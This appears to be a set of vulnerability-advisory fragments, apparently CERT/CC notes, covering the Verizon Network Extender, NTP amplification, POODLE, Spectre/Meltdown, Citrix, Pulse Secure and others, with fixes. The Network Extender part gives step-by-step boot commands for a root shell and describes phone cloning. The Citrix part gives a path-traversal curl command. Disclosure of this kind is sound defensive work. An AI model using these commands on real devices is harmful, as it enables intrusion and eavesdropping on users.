To be able to exploit this vulnerability, a special console cable must be created with an HDMI connector to connect to the device. Once it is possible to view boot output, the following steps will present a root shell:1) While viewing the boot output, a prompt will display: \"Press any key to interrupt boot\"2) Type \"sys\" and press <enter>3) Disable the watchdog by typing: setenv watchdog_off 14) Update the ramboot environment variable by typing: setenv ramboot version\\;echo\\;setenv\\ bootargs\\ mem=64M\\ console=ttyS0\\,57600n8\\ root=/dev/ram0\\ init=/bin/sh\\;mdocboot5) Type \"boot\" and press <enter> to boot the kernel and obtain a root shell.SCS-2U01 Root Exploit:----------------------The newer hardware version of the Network Extender is designated \"SCS-2U01\".It is possible to obtain console access to the SCS-2U01 even though the Uboot delay has been removed, using the SysReq (System Request) interrupt. The actual key combination used to send a SysReq is dependent on the terminal emulator program used on the connected computer. If successfully applied, this command will halt boot process and drop the user to a login prompt, where it is possible to login as the root user. As with the previous exploit, it is first necessary to create a console cable to be able to view and send commands to the device.1) While viewing the boot output, wait until the device attempts to extract the RFS.2) Enter <SysReq> i(1) 3) All running processes will be terminated and a login prompt will display4) Log in with the root username and password to obtain a root shell. (Note: This password is the same for all systems and is freely available on the Internet)Lack of CAVE Authentication:----------------------------The Network Extender does not appear to use Cellular Authentication and Voice Encryption (CAVE). For cellular phone authentication, the device appears to only use the ESN and MIN. These numbers can usually be obtained with physical access to a phone, or by sniffing registration packets as they transit the Network Extender. Combining the above root access flaws with a lack of proper authentication, it is possible to run custom code on the Network Extender that will obtain the ESN and MIN from any phone within range. Using these numbers, a phone can be cloned without direct physical access and without a user's knowledge, although association to the Network Extender is required.Fix Information:----------------It may not be possible to completely secure this device from unauthorized use. However, it is certainly possible to harden the device and make it more difficult to exploit. A detailed analysis should be performed on all aspects of the device, including hardware design.Proposed fixes:---------------1) The Uboot delay flaw in the SCS-26UC4 has been addressed in the upgrade to the SCS-2U01. Depending on the expected operational lifetime of the SCS-26UC4, it may be appropriate to apply a fix to these devices or to plan to remove them from the network.2) The SysReq vulnerability can be fixed by disabling the kernel variable: /proc/sys/kernel/sysrq = 0. Note: this change should be made in the kernel at compile time, rather than set via sysctl variables.3) CAVE Authentication should be implemented on the Network Extender.4) Change the root password; the current password has been published on the Internet for some time. The new root password should be extremely strong and beyond the reach of even projected password cracking ability. For example, a 40-character alphanumeric lowercase/uppercase string with symbols would be more suitable.5) Consider adding an increased system monitoring capability or tamper protections that will provide the ability to detect possible exploitation attempts. For example, monitoring certain device errors or user logins may provide information on potential break-in attempts.The fixes proposed above will mitigate the specific vulnerabilities discovered, but may not greatly increase the overall security of the system. Hardening the device can only go so far, as the system architecture itself is flawed. Because users are in physical possession of the device, it may not be possible to harden the Network Extender to the extent where it cannot be effectively exploited while also allowing it to be usable and serviceable. As long as data from the cellular handset transiting the Network Extender is available in plaintext, it will be vulnerable - even if communication is secured between the Network Extender and the internal Verizon network. Require registration of subscribers phones to specific femtocells, and enforce this on Verizon's core network. Subscribers should only be able to connect to femtocells they have been securely registered with. This prevents attackers from deploying rogue femtocells to capture arbitrary subscribers in an area. However it may still be possible for attackers to bypass the registration by isolating a subscriber from the core network and simulating phone calls or text messages and receiving responses from the device.Encrypting the communication between the handset and the carrier network end-to-end would make it much safer from eavesdroppers anywhere along the network path, including at the Network Extender. If this model of secure communication were applied to all voice, text and data traffic on the handset, the Network Extender architecture could be made significantly more secure. In this scenario, if a determined attacker were able to compromise a hardened device, data loss would be much less severe, since the data is encrypted and equivalent to what the attacker could see by sniffing their own network. This does not preclude other attacks that can be performed on encrypted data, but is a stronger and defensible architecture given the current system design.iSEC Partners stated they contacted Verizon on December 7th, 2012 and Samsung on January 3rd, 2013 for a coordinated disclosure of these vulnerabilities.. overview: iSEC Partners has reported that the Verizon Wireless Network Extender models SCS-26UC4 and SCS-2U01 made by Samsung are susceptible to a local compromise using a custom HDMI cable. Once compromised the device can be used to eavesdrop on voice, text and data communication for mobile devices that connect to the Network Extender.. impact: A local attacker using a custom HDMI cable may be able to compromise the Network Extender device to run custom code to enable the attacker to eavesdrop on voice, text and data communication for mobile devices that connect to the Network Extender.",

Servers running the network time protocol (NTP) based on implementations of ntpd prior to version 4.2.7p26 that use the default unrestricted query configuration are susceptible to a reflected denial-of-service (DRDoS) attack. Other proprietary NTP implementations may also be affected. This is similar in scope to DNS Amplification Attacks.In a reflected denial-of-service attack, the attacker spoofs the source address of attack traffic, replacing the source address with the target's address. Certain NTP control messages provide significant bandwidth amplification factors (BAF).NTP is designed for time synchronization, and may also implement other features such as server administration, maintenance, and monitoring. NTP relies on the user datagram protocol (UDP) to send and receive messages, which does not validate the source (IP address) of the sender. The NTP DRDoS attack is similar to the reflective DoS attacks used on open DNS resolvers. The attacker sends a packet with their source address being the IP of a victim. The NTP server replies to this request, but the number of bytes sent in the response is an amplified amount compared to the initial request, resulting in a denial-of-service on the victim. The two highest message types, REQ_MON_GETLIST and REQ_MON_GETLIST_1 amplify the original request by a factor of up to 3660 and 5500 respectively. This bandwidth amplification factor (BAF) is a bandwidth multiplier based on the number of UDP payload bytes that are sent by the server in comparison to the UDP payload bytes of the request. Other message types can also be used in this attack, but REQ_MON_GETLIST and REQ_MON_GETLIST_1 create the biggest impact.This vulnerability contains elements of CWE-406: Insufficient Control of Network Message Volume (Network Amplification).More information can be found in Christian Rossow's \"Amplification DDoS Attacks (Ab)using NTP Servers\" blog post.In April 2014, Rapid7 published R7-2014-12 documenting additional NTP commands that can amplify traffic and disclose potentially sensitive information.. overview: UDP protocols such as NTP can be abused to amplify denial-of-service attack traffic.

Valid usernames return with an HTTP 302 Found response, whereas an invalid username returns an HTTP 200 OK response.The attacker may also utilize a similar vulnerability in the Treasurer application. When the attacker sends an invalid search request to the search application, the response exposes the query structure to the malicious user which can leak unauthorized sensitive information.The CVSS score below reflects CVE-2013-6020.. overview: Tyler Technologies TaxWeb 3.13.3.1 and possibly earlier versions contain cross-site request forgery (CWE-352), information exposure (CWE-203), and reflected cross-site scripting (CWE-79) vulnerabilities.. impact: A remote unauthenticated attacker can conduct a cross-site scripting or cross-site request forgery attack, which could be used make unauthorized changes to user credentials or inject arbitrary HTML content (including script) into a web page presented to the user.

The Mozilla Network Security Services (NSS) library incorrectly parses PKCS#1 v1.5 padded signatures due to the use of a vulnerable implementation of ASN.1 encoding of DigestInfo. Vulnerable implementations parse the DigestInfo field using the BER encoding, which allows multiple ways of encoding the same ASN.1 object. The parser implementation allows for bytes to skip validation, allowing an attacker to forge a signature when a RSA key with a low public exponent (e.g., three) is used.This vulnerability is a variant of the Bleichenbacher vulnerability, where unvalidated bytes are allowed in the least significant bytes of the signature.Mozilla NSS is used by other software products including a number of Linux distributions and packages, Google Chrome, and Google Chrome OS. It is also possible that other cryptographic libraries may have similar vulnerabilities.. overview: The Mozilla Network Security Services (NSS) library fails to properly verify RSA signatures due to incorrect ASN.1 parsing of DigestInfo. This vulnerability may allow an attacker to forge a RSA signature, such as a SSL certificate.. impact: This vulnerability may allow an attacker to forge a RSA signature, such as a SSL certificate.",

When a web site is created using CommonSpot, most of these pages are exposed to the public internet. CommonSpot contains multiple vulnerabilities with a range of impacts. Server-side vulnerabilities in CommonSpot will run with the privileges of the ColdFusion service, which is SYSTEM by default.CWE-425: Direct Request ('Forced Browsing')Most of the vulnerabilities in CommonSpot are exposed because of CWE-425. While the CFM pages that comprise CommonSpot are intended to be used together to provide CMS functionality, many of the individual CFM pages can be accessed directly. Many of these pages also accept untrusted input.CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')Many CommonSpot pages read data from the HTTP request and reflect it back in the HTTP response (Type 1: reflected XSS). In some cases, the reflected data is improperly sanitized, which can allow an attacker to inject HTML elements, such as <script>. In other cases, the reflected data is already within a <script> element, which makes most attempts at sanitization futile. With some pages, some sanitization does take place, such as stripping URI parameters that contain the string \"alert\". CommonSpot contains instances of CWE-79 that are ColdFusion-based (CFM) as well as pure JavaScript and HTML based. Instances of CWE-79 can be used to steal cookies, which are used for authentication.CWE-284: Improper Access ControlCommonSpot inconsistently enforces access control. Many pages can be used by an anonymous actor when accessed directly.CWE-285: Improper AuthorizationIn many cases, CommonSpot fails to authorize users before taking potentially-dangerous actions.CWE-73: External Control of File Name or PathSome pages that are provided by CommonSpot accept parameters that are fully-qualified filesystem paths.CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')Some pages that use file names as parameters are vulnerable to directory traversal attacks.CWE-158: Improper Neutralization of Null Byte or NUL CharacterSome pages may terminate an attacker-provided string to be terminated earlier than expected. When combined with CWE-22, this can allow for control of a file path on the same drive as the ColdFusion web root.CWE-602: Client-Side Enforcement of Server-Side SecuritySeveral unsafe CommonSpot operations are restricted on the client side using JavaScript. Because client-side JavaScript is under attacker control, these restrictions are not properly enforced.CWE-434: Unrestricted Upload of File with Dangerous TypeCommonSpot can allow authenticated users to upload arbitrary ColdFusion pages, which can allow arbitrary code execution on the server with the privileges of the ColdFusion service.CWE-472: External Control of Assumed-Immutable Web ParameterMany CommonSpot pages use ColdFusion variables that can be overriden via the URI (HTTP GET).CWE-200: Information ExposureSeveral CommonSpot pages disclose sensitive information about the server, including server name, filesystem paths, SQL server type and DSNs, administrative email and SMTP server address.CWE-312: Cleartext Storage of Sensitive InformationCommonSpot by default stores cleartext credentials in its database. Note that this behavior is documented, and it is possible to enable encryption.CWE-319: Cleartext Transmission of Sensitive InformationThe login pages used by CommonSpot transmit credentials in cleartext.

Although uploaded HTML files are validated for javascript code, XHTML files are not. Therefore, a remote authenticated attacker could upload an XHTML file containing arbitrary javascript code. When a victim visits the XHTML file in their browser, the javascript will be executed.Additionally, the software relies upon an HTML parser to filter untrusted input from various input fields within the application. A specially crafted HTML input allows an authenticated attacker to bypass the HTML parser and persist javascript on various pages of Alfresco. Specifically, the HTML parser considers the <% tag to introduce JSP/ASP code, which the application considers to be unharmful. By escaping crafted input with the <% tag, an attacker can evade the application's anti-XSS mechanisms.Lastly, the taskId GET parameter to the /share/page/task-edit URL is vulnerable to a reflected cross-site scripting vulnerability.. overview: Alfresco Enterprise 4.1.6 and possibly earlier versions are vulnerable to multiple cross-site scripting (XSS) vulnerabilities.. impact: A remote attacker may be able to execute arbitrary script in the context of the end-user's browser session.

A successful padding-oracle attack can provide an attacker with cleartext information from the encrypted communications.Additionally, many modern TLS clients still support the ability to fall back to the SSL 3.0 protocol in order to communicate with legacy servers. A man-in-the-middle attacker may be able to force the protocol version negotiation sequence to downgrade to SSL 3.0, thereby opening up the opportunity to exploit the padding-oracle attack.For more information, please refer to the original security advisory.. overview: Many modern TLS clients can fall back to version 3.0 of the SSL protocol, which is vulnerable to a padding-oracle attack when Cypher-block chaining (CBC) mode is used. This is commonly referred to as the \"POODLE\" (Padding Oracle On Downgraded Legacy Encryption) attack.. impact: An adjacent, unauthenticated attacker may be able to derive cleartext information from communications that utilize the SSL 3.0 protocol with CBC mode.",

    "body": "Komodia Redirector SDK is a self-described \"interception engine\" designed to enable developers to integrate proxy services and web traffic modification (such as ad injection) into their applications. With the SSL Digestor module, HTTPS traffic can also be manipulated. This is accomplished by installing a root CA certificate into browser trusted certificate stores, enabling the proxy to effectively man-in-the-middle all web traffic without raising any flags for the end-user.In multiple applications implementing Komodia's libraries, such as Superfish Visual Discovery and KeepMyFamilySecure, the root CA certificates have been found to use trivially obtainable, publicly disclosed, hard-coded private keys. Note that these keys appear to be distinct per application, though the same methods have proven successful in revealing the private keys in each instance.In addition to sharing root CA certificates across installation, it has been reported that the SSL validation that Komodia itself performs is broken. This vulnerability can allow an attacker to universally attack all installations of Komodia Redirector, rather than needing to focus on a single application / certificate.Users should be aware that uninstalling affected applications is not sufficient to remove the security risk since the root certificates are not removed in the process. Lenovo, whose consumer-grade systems come bundled with the software, have provided instructions and an automated removal tool. A list of potentially affected Lenovo systems is available here.Users can verify whether their systems contain Superfish and other Komodia root certificates by visiting this site.. overview: Komodia Redirector with SSL Digestor installs non-unique root CA certificates and private keys, making systems broadly vulnerable to HTTPS spoofing. impact: An attacker can spoof HTTPS sites and intercept HTTPS traffic without triggering browser certificate warnings in affected systems.",

Such a number, particularly if re-used, severely weakens applications of the Diffie-Hellman protocol such as TLS, allowing an attacker in some scenarios to possibly determine the Diffie-Hellman private exponent and decrypt the underlying traffic.The researcher states in a blog post however that this attack \"requires that the attacker complete multiple handshakes in which the peer (OpenSSL in this case) uses the same private DH exponent.\"CWE-757: Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade') - CVE-2015-3197According to OpenSSL, \"A malicious client can negotiate SSLv2 ciphers that have been disabled on the server and complete SSLv2 handshakes even if all SSLv2 ciphers have been disabled, provided that the SSLv2 protocol was not also disabled via SSL_OP_NO_SSLv2.\"For more information, please see OpenSSL's security advisory.The CVSS score below is based on CVE-2016-0701.. overview: OpenSSL may generate unsafe primes for use in the Diffie-Hellman protocol, which may lead to disclosure of enough information for an attacker to recover the private encryption key.. impact: A malicious remote user may be able to learn sensitive information by obtaining the decryption key.

It is possible to store a data value that is larger than the size of the buffer that the ctl_getitem() function of ntpd uses to report the return value. If the length of the requested data value returned by ctl_getitem() is too large, the value NULL is returned instead. There are 2 cases where the return value from ctl_getitem() was not directly checked to make sure it's not NULL, but there are subsequent INSIST() checks that make sure the return value is not NULL. There are no data values ordinarily stored in ntpd that would exceed this buffer length. But if one has permission to store values and one stores a value that is \"too large\", then ntpd will abort if an attempt is made to read that oversized value.CWE-20: Improper Input Validation - CVE-2015-7704, CVE-2015-7705An ntpd client that honors Kiss-of-Death (KoD) responses will honor KoD messages that have been forged by an attacker, causing it to delay or stop querying its servers for time updates. Also, an attacker can forge packets that claim to be from the target and send them to servers often enough that a server that implements KoD rate limiting will send the target machine a KoD response to attempt to reduce the rate of incoming packets, or it may also trigger a firewall block at the server for packets from the target machine. For either of these attacks to succeed, the attacker must know what servers the target is communicating with. An attacker can be anywhere on the Internet and can frequently learn the identity of the target's time source by sending the target a time query.

    "body": "Microsoft Equation Editor is a component that comes with Microsoft Office. It is an out-of-process COM server that is hosted by eqnedt32.exe. The Microsoft Equation Editor contains a stack buffer overflow vulnerability.Memory corruption vulnerabilities in modern software are often mitigated by exploit protections, such as DEP and ASLR. More modern memory corruption protections include features like CFG. Even in a modern, fully-patched Microsoft Office 2016 system, the Microsoft Equation Editor lacks any exploit protections, however. This lack of exploit protections allows an attacker to achieve code execution more easily than if protections were in place. For example, because eqnedt32.exe was linked without the /DYNAMICBASE flag, it will not be loaded at a randomized location by default.Because Equation Editor is an out-of-process COM server, this also means that protections specific to any Microsoft Office application may not have an effect on this vulnerability. For example, if the exploit document is an RTF document, the document will open in Microsoft Word. However, the COM server eqnedt32.exe is invoked by the Windows DCOM Server Process Launcher service, as opposed to Word itself. For this reason, EMET or Windows Defender Exploit Guard protections specific to the Microsoft Office programs themselves will not protect users. For this same reason, none of the Windows Defender Exploit Guard Attack Surface Reduction (ASR) protections will help either.Windows 7 users who have EMET configured for ASLR to be \"always on\" at a system-wide level are protected against known exploitation techniques for this vulnerability. Starting with Windows 8.0, system-wide ASLR receives entropy for non-DYNAMICBASE code only if bottom-up ASLR is enabled on a system-wide level as well. Neither EMET nor Windows Defender Exploit Guard configures system-wide bottom-up ASLR though. Because of this, Windows 8.0 through Windows 10 systems must enable specific protections for this vulnerability.. overview: Microsoft Equation Editor contains a stack buffer overflow, which can allow a remote, unauthenticated attacker to execute arbitrary code on a vulnerable system.. impact: By convincing a user to open a specially-crafted Office document, a remote, unauthenticated attacker may be able to execute arbitrary code with the privileges of the logged-on user.",

    "body": "CWE-310: Cryptographic IssuesThe P1735 IEEE standard describes methods for encrypting electronic-design intellectual property (IP), as well as the management of access rights for such IP. The methods are flawed and, in the most egregious cases, enable attack vectors that allow recovery of the entire underlying plaintext IP. Some of these attack vectors are well-known, such as padding-oracle attacks. Others are new, and are made possible by the need to support the typical uses of the underlying IP. In particular, the need for commercial electronic design automation (EDA) tools to synthesize multiple pieces of IP into a fully specified chip design and to provide HDL syntax errors. These flaws can be exploited by leveraging the commercial EDA tool as a black-box oracle. In addition to being able to recover entire plaintext IP, one can produce standard-compliant ciphertexts of IP that have been modified to include targeted hardware Trojans.Design of complex electronics design intellectual property (IP) involves multiple IP owners. To prevent rogue entities in the design flow from stealing their IPs, they use the P1735 IEEE standard to provide confidentiality and access control. The standard not only recommends poor cryptographic choices, it is vague/silent on security critical decisions.The following CVE IDs were assigned to document weaknesses in the P1735 standard as described in the researcher's paper.CVE-2017-13091: improperly specified padding in CBC mode allows use of an EDA tool as a decryption oracle.CVE-2017-13092: improperly specified HDL syntax allows use of an EDA tool as a decryption oracleCVE-2017-13093: modification of encrypted IP cyphertext to insert hardware trojans.CVE-2017-13094: modification of the encryption key and insertion of hardware trojans in any IP.CVE-2017-13095: modification of a license-deny response to a license grant.The following weaknesses in the P1735 standard were also identified and assigned CVE IDs:CVE-2017-13096: modification of Rights Block to remove or relax access control.CVE-2017-13097: modification of Rights Block to remove or relax license requirement.While CVE-2017-13096 and CVE-2017-13097 are not explicitly discussed in the research paper, section 4.2 of the paper describes a similar attack method and mitigation. The Rights Block of the digital envelope contains the Key Block (encryption of AES key under RSA public key of the EDA tool provider) as well as access control and license requirements. An attacker with information about the IP may be able to select a new AES key and spoof a new Rights Block for an EDA tool that modifies or removes the original access control or licensing requirements specified by the original IP owner.All CVE IDs above may extend to EDA tools that utilize the P1735 standard, or products designed with such EDA tools.. overview: The P1735 IEEE standard describes methods for encrypting electronic-design intellectual property (IP), as well as the management of access rights for such IP. The methods are flawed and, in the most egregious cases, enable attack vectors that allow recovery of the entire underlying plaintext IP. Implementations of IEEE P1735 may be weak to cryptographic attacks that allow an attacker to obtain plaintext intellectual property without the key, among other impacts.. impact: An adversary can recover electronic design IPs encrypted using the P1735 workflow, resulting in IP theft and/or analysis of security critical features, as well as the ability to insert hardware trojans into an encrypted IP without the knowledge of the IP owner. Impacts may include loss of profit and reputation of the IP owners as well as integrated circuits (ICs) with trojans that contain backdoors, perform poorly, or even fail completely.

    "title": "CPU hardware vulnerable to side-channel attacks",
    "body": "CPU hardware implementations are vulnerable to side-channel attacks referred to as Meltdown and Spectre. Both Spectre and Meltdown take advantage of the ability to extract information from instructions that have executed on a CPU using the CPU cache as a side-channel. These attacks are described in detail by Google Project Zero, the Institute of Applied Information Processing and Communications (IAIK) at Graz University of Technology (TU Graz) and Anders Fogh. The issues are organized into three variants:Variant 1 (CVE-2017-5753, Spectre): Bounds check bypassVariant 2 (CVE-2017-5715, also Spectre): Branch target injectionVariant 3 (CVE-2017-5754, Meltdown): Rogue data cache load, memory access permission check performed after kernel memory readSpectreSpectre attacks take advantage of a CPU's branch prediction capabilities. Modern CPUs include a feature called branch prediction, which speculatively executes instructions at a location that the CPU believes it will branch to. Such speculative execution helps to more fully utilize the parts of the CPU, minimizing the time waiting, and therefore improving performance. When a branch is successfully predicted, instructions will retire, which means the outcomes of the instructions such as register and memory writes will be committed. If a branch is mispredicted, the speculatively-executed instructions will be discarded, and the direct side-effects of the instructions are undone. What is not undone are the indirect side-effects, such as CPU cache changes. By measuring latency of memory access operations, the cache can be used to extract values from speculatively-executed instructions.With Spectre variant 1 (CVE-2017-5753), the instructions after a conditional branch are speculatively executed as the result of a misprediction. With Spectre variant 2 (CVE-2017-5715), the CPU executes instructions at a location determined by a mispredicted branch target.With both variants of the Spectre attack, the impact is that a process may leak sensitive data to other processes on a system. Spectre may also allow one part of an application to access other parts of the same process memory space that would otherwise not be permitted.While the Spectre attack itself does not cross a user/kernel memory privilege boundary, depending on the configuration of the target platform, the Spectre attack may indirectly allow a user-space application to access kernel memory. For example, the Project Zero blog post describes a scenario that uses eBPF to exfiltrate kernel memory contents into user-space code. This is made possible because eBPF JIT allows for userspace applications to inject code that is executed in kernel space. While this code is verified by the kernel, eBPF-compliant code will be allowed to execute with kernel permissions. The exploit described by Project Zero leverages eBPF to execute the Spectre attack in kernel space, while exfiltrating the data to user space. It is possible that other technologies that allow in-kernel code execution may also possibly be leveraged to leak kernel memory using Spectre.MeltdownMeltdown is related to the Spectre attack in that it also uses a cache side channel to access data that otherwise wouldn't be available. The main difference is that it leverages out-of-order execution capabilities in modern CPUs. Like speculative execution due to branch prediction, as used by Spectre, out-of-order execution on a CPU is a technique for ensuring fullest utilization of the CPU's parts. Although instructions may appear sequentially in the machine language, a CPU that supports out-of-order execution may execute instructions in a non-sequential manner, which can minimize the time that a CPU spends idle.Meltdown leverages insecure behavior that has been demonstrated in Intel CPUs and may affect CPUs from other vendors. Vulnerable CPUs allow memory reads in out-of-order instruction execution, and also contain a race condition between the raising of exceptions and the out-of-order instruction execution. The Meltdown attack reads a kernel memory value, which raises an exception because code running with user-space privileges are not permitted to directly read kernel memory. However, due to the race condition, out-of-order instructions following the faulting instruction may also execute. Even though instructions appear after the faulting instruction, out-of-order execution allows them to execute, using data retrieved from the instruction that raises the exception. By the time the exception is raised, some number of out-of-order instructions have executed. Although the raised exception causes the CPU to roll back the out-of-order instructions, the cache state is not reverted. This allows data from out-of-order instructions to persist beyond the point when the exception has been raised.The impact of Meltdown is that a process running in user space is able to view the contents of kernel memory. Meltdown may also allow Spectre-like memory content leaking that does not cross the user/kernel privilege boundary.The Linux kernel mitigations for Meltdown are referred to as KAISER, and subsequently KPTI, which aim to improve separation of kernel and user memory pages. Because the Spectre attacks do not cross user/kernel boundaries, the protections introduced with KAISER/KPTI do not add any protection against them.The following table compares Spectre and Meltdown.SpectreMeltdownCPU mechanism for triggeringSpeculative execution from branch predictionOut-of-order executionAffected platformsCPUs that perform speculative execution from branch predictionCPUs that allow memory reads in out-of-order instructionsDifficulty of successful attackHigh - Requires tailoring to the software environment of the victim processLow - Kernel memory access exploit code is mostly universalImpactCross- and intra-process (including kernel) memory disclosureKernel memory disclosure to userspaceSoftware mitigationsVariant 1: Compiler changes.

Note: The software mitigation for Spectre variant 2 requires CPU microcode updatesKernel page-table isolation (KPTI). overview: CPU hardware implementations are vulnerable to cache side-channel attacks. These vulnerabilities are referred to as Meltdown and Spectre.. impact: An attacker able to execute code with user privileges can achieve various impacts. The Meltdown attack allows reading of kernel memory from userspace. This can result in privilege escalation, disclosure of sensitive information, or it can weaken kernel-level protections, such as KASLR. The Spectre attack can allow inter-process or intra-process data leaks.To execute code locally, an attacker would require a valid account or independent compromise of the target. Attacks using JavaScript in web browsers are possible. Multi-user and multi-tenant systems (including virtualized and cloud environments) likely face the greatest risk. Systems used to browse arbitrary web sites are also at risk. Single-user systems that do not readily provide a way for attackers to execute code locally face significantly lower risk.",

    "body": "An academic paper describes an attack called \"GLitch,\" which leverages two different techniques to achieve a compromise of a web browser using WebGL. The attack is only feasible on platforms where the CPU and GPU share the same memory, such as a smartphone or similar device. The two components of the attack are:A Side-channel attack to determine physical memory layoutA Rowhammer attack to flip the value of one or more bits in physical memoryThe side-channel attackThe precise timing capabilities provided by WebGL can allow an attacker to determine the difference between cached DRAM accesses and uncached DRAM accesses. This can allow an attacker to determine contiguous areas of physical DRAM memory. Knowledge of contiguous memory regions are used in a number of microarchitectural attacks, such as rowhammer.The rowhammer attackThe rowhammer attack targets the design of DRAM memory. On a system where the DRAM is insufficiently refreshed, targeted operations on a row of DRAM memory may be able to influence the memory values on neighboring rows. Protections against the rowhammer attack include the use of ECC DRAM, as well as increased refresh rates. The LPDDR4 mobile memory standard also has optional hardware support for target row refresh, which can mitigate the rowhammer attack.Combining the attacks with WebGLThe GLitch attack leverages both a side-channel attack to determine contiguous memory, as well as rowhammer. With the knowledge of contiguous memory, an attacker may be able to determine relative physical addresses. This knowledge of relative physical addresses can let the attacker know what memory locations to target with the rowhammer attack. The use of WebGL with precise timers is important in the GLitch attack for these reasons:Precise WebGL timers allow a side-channel to leak memory addresses.GPU capabilities exposed via WebGL allow for fast double-sided DRAM access, enabling the rowhammer attack.The impact of combining both the side-channel attack and rowhammer attack has been demonstrated to bypass the Firefox sandbox on the Android platform.GLitch success rates in testingIt is important to realize that the GLitch attack has only successfully been demonstrated on the Nexus 5 phone, which was released in 2013. The Nexus 5 phone received its last software security update in October, 2015, and is therefore an already unsafe device to use. Several other phones released in 2013 were tested, but were not able to successfully be attacked with the GLitch attack. Success rates on phones newer than 2013 models were not provided. Non-Android devices were not tested as well.. overview: Some platforms with integrated GPUs, such as smartphones, may allow both side-channel and rowhammer attacks via WebGL, which may allow a remote attacker to compromise the browser on an affected platform.

Since the flow of execution does not stop, it will copy the overly large packet to the buffer and cause a heap overflow.CVE-2018-7080 - also known as BLEEDINGBITThe following Texas Instruments devices are affected if the Over the Air firmware Download (OAD) feature is enabled and not sufficiently secured:CC2642RCC2640R2CC2640CC2650CC2540CC2541Certain Aruba access points are affected.The OAD feature allows for remote firmware updates of some BLE chips. An attacker could connect to a BLE chip on a vulnerable access point (either without authentication or by obtaining the password through other means depending on the implementation) and upload their own malicious firmware, which could give them complete control over the access point.. overview: Texas Instruments CC2640 and CC2650 microcontrollers are vulnerable to a heap overflow and may allow unauthenticated firmware installation.. impact: Using a specially crafted set of packets, an attacker can both control the data of the overflow, and the length of it, which may lead to remote code execution on the targeted BLE chip. An attacker needs to be within physical proximity to the device while it is in scanning mode to trigger vulnerable code. This memory corruption can lead to code execution on the main CPU of the device, which could have the potential to affect other devices across a network if the origin is a networked device. An attacker could also exploit this vulnerability to rewrite the operating system of a device and gain full control over it.Given the nature of embedded devices, it is possible that a broader set of devices are impacted than what is listed in this publication.

Initially there was a lack of clarity about CVE-2019-11510, as to whether it can be mitigated with the requirement of a client-certificate or two-factor authentication (2FA) to prevent this attack. CERT/CC has confirmed with the vendor that this vulnerability cannot be mitigated using client certificate and furthermore there is no viable alternative to updating the Pulse Secure VPN software to a non-vulnerable version. Even if client certificates are required for user authentication, CVE-2019-11510 can be exploited by an unauthenticated remote attacker to obtain session IDs of active users stored in /data/runtime/mtmp/lmdb/randomVal/data.mdb. The attacker can use these session IDs to impersonate as one of the active users. If a Pulse Secure administrator is currently active and the administrative access is available to the attacker, attacker could gain administrative access to Pulse Secure VPN. It is highly recommended that all Pulse Secure VPN administrators perform the required upgrade on all their affected products. If your Pulse Secure VPN has been identified as End of Engineering (EOE) and End of Life (EOL), we highly recommend replacement of the VPN appliance entirely without any delay - please check Pulse Secure advisory for this information.Timelines of specific events:March 22, 2019 – Security researcher O.

Although the bulletin does not describe details about the vulnerability, the mitigation steps describe techniques to block the handling of requests that contain a directory traversal attempt (/../) and also requests that attempt to access the /vpns/ directory.Limited testing has shown that the affected Citrix software fails to restrict access to perl scripts that are available via the /vpns/ path. An unauthenticated remote attacker may be able to provide crafted content to these scripts that result in arbitrary code execution. One technique that has been outlined involves the writing of an XML file using a directory traversal and the subsequent command execution by way of the Perl Template Toolkit. Other exploitation techniques may be possible.A link of the following form can be used to determine if a system is affected:https:// CITRIXGATEWAY /vpn/../vpns/cfg/smb.confFor example, the following curl command can be used:curl https:// CITRIXGATEWAY /vpn/../vpns/cfg/smb.conf --path-as-is -k -fThe \" CITRIXGATEWAY \" string should be replaced with the name or IP of the system you wish to test.

    "title": "Bluetooth BR/EDR supported devices are vulnerable to key negotiation attacks",
    "body": "Bluetooth is a short-range wireless technology based off of a core specification that defines six different core configurations, including the Bluetooth Basic Rate / Enhanced Data Rate Core Configurations. Bluetooth BR/EDR is used for low-power short-range communications. To establish an encrypted connection, two Bluetooth devices must pair with each other and establish a link key that is used to generate the encryption key. For example, assume that there are two controllers attempting to establish a connection: Alice and Bob. After authenticating the link key, Alice proposes that she and Bob use 16 bytes of entropy. This number, N, could be between 1 and 16 bytes. Bob can either accept this, reject this and abort the negotiation, or propose a smaller value. Bob may wish to propose a smaller N value because he (the controller) does not support the larger amount of bytes proposed by Alice. After proposing a smaller amount, Alice can accept it and request to activate link-layer encryption with Bob, which Bob can accept.An attacker, Charlie, could force Alice and Bob to use a smaller N by intercepting Alice's proposal request to Bob and changing N. Charlie could lower N to as low as 1 byte, which Bob would subsequently accept since Bob supports 1 byte of entropy and it is within the range of the compliant values. Charlie could then intercept Bob's acceptance message to Alice and change the entropy proposal to 1 byte, which Alice would likely accept, because she may believe that Bob cannot support a larger N. Thus, both Alice and Bob would accept N and inform the Bluetooth hosts that encryption is active, without acknowledging or realizing that N is lower than either of them initially intended it to be.. overview: The encryption key length negotiation process in Bluetooth BR/EDR Core v5.1 and earlier is vulnerable to packet injection by an unauthenticated, adjacent attacker that could result in information disclosure and/or escalation of privileges. This can be achieved using an attack referred to as the Key Negotiation of Bluetooth (KNOB) attack, which is when a third party forces two or more victims to agree on an encryption key with as little as one byte of entropy. Once the entropy is reduced, the attacker can brute-force the encryption key and use it to decrypt communications.. impact: An unauthenticated, adjacent attacker can force two Bluetooth devices to use as low as 1 byte of entropy. This would make it easier for an attacker to brute force as it reduces the total number of possible keys to try, and would give them the ability to decrypt all of the traffic between the devices during that session.",

Although the web server does not run as the root user, many ZyXEL devices include a setuid utility that can be leveraged to run any command with root privileges. As such, it should be assumed that exploitation of this vulnerability can lead to remote code execution with root privileges.Exploit code for this vulnerability that targets NAS devices is available on the internet. For this reason, we have created a PoC exploit that has the ability to power down affected ZyXEL NAS devices.. overview: Multiple ZyXEL devices contain a pre-authentication command injection vulnerability, which may allow a remote, unauthenticated attacker to execute arbitrary code on a vulnerable device.. impact: By sending a specially-crafted HTTP POST or GET request to a vulnerable ZyXEL device, a remote, unauthenticated attacker may be able to execute arbitrary code on the device. This may happen by directly connecting to a device if it is directly exposed to an attacker. However, there are ways to trigger such crafted requests even if an attacker does not have direct connectivity to a vulnerable devices.

